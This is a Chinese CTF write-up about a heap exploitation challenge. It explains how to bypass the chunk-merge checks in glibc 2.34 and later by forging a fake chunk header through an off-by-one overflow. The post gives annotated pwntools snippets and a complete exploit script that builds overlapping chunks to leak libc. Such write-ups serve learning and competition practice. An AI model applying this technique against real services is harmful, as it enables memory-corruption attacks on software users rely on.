---
date: 2024-3-25
tag:
  - pwn
  - heap
---

# vctf apples leak libc操作复现(高版本的overlapping)

> 题目中存在off_by_one libc版本2.34以上我们没办法使用常规的overlapping 泄露libc地址
>
> 所以我们要精心构造一个chunk head来绕过新版本的检查机制 实现leak libc的操作
>
> 文章中我们先讲原理 在最后会将Arahat0师傅的脚本给出来()

## 安全检查机制

- 2.34下的合并检查机制

  - 检查size是否对得上

  ![image-20240325110240440](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325110240440.png)

  - unlink检查

    ![image-20240325110339049](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325110339049.png)

## 利用原理

> 这里先简单说一下我们要干什么
>
> 后面详细说一下我们的利用流程

- 构造一个chunkheader 让它的size fd bk都符合检查机制

## 利用

### 构造chunk header

> 主要是构造合法的size fd bk 我们把我们构造的chunk叫做fake chunk

- 代码

  ```python
  add(0x410, "a" * 8)  # 0  290
  add(0x100, "a" * 8)  # 1  6b0
  add(0x430, "a" * 8)  # 2  7c0
  add(0x430, "a" * 8)  # 3  c00
  add(0x100, "a" * 8)  # 4  1040
  add(0x480, "a" * 8)  # 5  1150
  add(0x420, "a" * 8)  # 6  15e0
  add(0x10, "a" * 8)  # 7  1a10
  
  free(0)
  free(3)
  free(6)
  # 触发合并 然后合成一个0x860的大chunk 让我们可以分割
  # 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk
  free(2)
  # add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方
  # 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头
  add(0x450, b"a" * 0x438 + p16(0x551))  # 0
  # 将 chunk3 变为allocted
  add(0x410, "a" * 8)  # 2
  add(0x420, "a" * 8)  # 3
  add(0x410, "a" * 8)  # 6
  ```

- free 3个chunk(chunk0 chunk3 chunk6)  这样chunk3(的fd和bk分别指向chunk 0 chunk6

  > 这里需要特殊说明 这里的chunk3的地址要特殊一些 也就是最低的地址为00 这样方便我们后面使用off_by_one漏洞来实现修改fd/bk的低地址为0来让FD->bk BK->fd 指向我们伪造的chunk (后面会详细说明)

-  free 一个chunk 让两个chunk(chunk3 与chun2)合并 这样就保留了fd(chunk 0)和bk(chunk6)在一个大的chunk中
- 然后我们将这个大chunk分割为chunk3 和chunk4 让我们自己构造的size刚好覆盖在原chunk3 size 位置 详细看下方图

![image-20240325111430446](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325111430446.png)

- 分割大chunk 并且构造size

  ![image-20240325111521964](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325111521964.png)

​	

- 这里我们已经成功构造好了 size和fd bk 那么后面我们就要想办法让chunk 0的bk 和chunk6的fd指向我们构造的chunk

### 构造FD->bk

> 这里主要是利用先让chunk0的bk 指向chunk3 然后利用off_by_one漏洞覆写bk 指向我们的fake chunk

- 代码

  ```python
  # 覆写chunk0的fd
  free(6) #free的chunk 3
  free(2) #free的chunk 0
  add(0x410, "a" * 8)  # 2
  add(0x410, "a" * 8)  # 6
  ```

- 示意图

  ![image-20240325114920279](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325114920279.png)

### 构造BK->fd

> 这里就要复杂一点了 因为修改chunk 6 的fd不能像修改FD->bk那样直接free 然后add
>
> 我们需要利用 合并机制来修改 也就是先free chunk3 chunk 6 以及chunk5 触发chunk6和chunk5合并
>
> 然后我们分割一个chunk 5出来 并且向原本chunk6 size fd位置赋值

- 代码

  ```python
  free(6)
  free(3)
  free(5)
  
  add(0x4f0, b"b" * 0x488 + p64(0x431))  # 3
  add(0x3b0, "a" * 8)  # 5
  ```

- 示意图

![image-20240325115900055](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325115900055.png)

- add后

![image-20240325135125545](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325135125545.png)

### 构造合并chunk

> 这里就要简单很多了 就是利用一次合并机制和分割机制 造成prev_inuse变为0 并且构造好prev_size
>
> 只不过我们还是得调整一下要选择合并的chunk的位置 因为我们刚才构造的fake chunk大小为0x550所以我们要在fake chunk往下0x550位置弄出一个 allocted chunk
>
> 下面的解释其实有失偏颇 因为其实是我们专门计算的0x550这个数据 刚好对上一个chunk 但是为了方便理解我们选择倒推的方式

- 代码

  ```c
  free(4)
  
  add(0x108, b"c" * 0x100 + p64(0x550))  # 4
  add(0x400, "a" * 8)  # 6
  free(3)
  add(0x10, "a" * 8)  # 3
  show(6)
  ```

- 首先我们看一下 fakechunk 0x550偏移位置坐标在哪里

  ![image-20240325145741621](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325145741621.png)

  ![image-20240325145825097](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325145825097.png)

- 根据地址我们知道 也就是我们要修改的chunk为chunk 5 那么我们就去free掉chunk 4(大小0x110)然后malloc回来 写入数据覆盖到chunk 5的prev_inuse 并且构造好0x550的prev_size

- 示意图

  ![image-20240325150321671](https://awaqwqa.github.io/img/vctf_leak_libc/image-20240325150321671.png)

- 此时我们成功完成构造 最后只需要 free掉chunk 5触发合并机制 然后我们成功完成一次overlapping 可喜可贺



## 脚本

```python
from pwn import *
# from pwncli import *

# context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'sp', '-h']
context(os='linux', arch='amd64')
local = 1
elf = ELF('./vuln')
if local:
    p = gdb.debug('./vuln',"b *main+57")
    libc = ELF('./libc.so')
else:
    p = remote('', 0)
    libc = ELF('./libc.so')

sd = lambda s: p.send(s)
sl = lambda s: p.sendline(s)
sa = lambda n, s: p.sendafter(n, s)
sla = lambda n, s: p.sendlineafter(n, s)
rc = lambda n: p.recv(n)
rl = lambda: p.recvline()
ru = lambda s: p.recvuntil(s)
ra = lambda: p.recvall()
ia = lambda: p.interactive()
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))




def cmd(op):
    sla(">> ", str(op))


def add(size, content):
    cmd(1)
    sla("How many students do you want to add: ", str(1))
    sla("Gender (m/f): ", "m")
    sla("Size: ", str(size))
    sa("Content:", content)
    print("--------------\nadd一个\n--------------")


def show(index):  # gender,content,size
    cmd(2)
    sla("Enter the index of the student: ", str(index))
    cmd(2)
    print("--------------\nshow一个\n--------------")

def free(index):  # gender,content,size
    cmd(3)
    sla("Enter the index of the student: ", str(index))
    cmd(2)
    print("--------------\n删除一个\n--------------")

add(0x410, "a" * 8)  # 0  290
add(0x100, "a" * 8)  # 1  6b0
add(0x430, "a" * 8)  # 2  7c0
add(0x430, "a" * 8)  # 3  c00
add(0x100, "a" * 8)  # 4  1040
add(0x480, "a" * 8)  # 5  1150
add(0x420, "a" * 8)  # 6  15e0
add(0x10, "a" * 8)  # 7  1a10

free(0)
free(3)
free(6)
# 触发合并 然后合成一个0x860的大chunk 让我们可以分割
# 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk
free(2)
# add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方
# 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头
add(0x450, b"a" * 0x438 + p16(0x551))  # 0
# 将 chunk3 变为allocted
add(0x410, "a" * 8)  # 2
add(0x420, "a" * 8)  # 3
add(0x410, "a" * 8)  # 6
print("构造fake chunk成功")
free(6)
free(2)
add(0x410, "a" * 8)  # 2
add(0x410, "a" * 8)  # 6
print("构造FD->bk成功")
free(6)
free(3)
free(5)

add(0x4f0, b"b" * 0x488 + p64(0x431))  # 3
add(0x3b0, "a" * 8)  # 5
print("构造BK->fd成功")
free(4)

add(0x108, b"c" * 0x100 + p64(0x550))  # 4
add(0x400, "a" * 8)  # 6
free(3)
add(0x10, "a" * 8)  # 3
show(6)
```

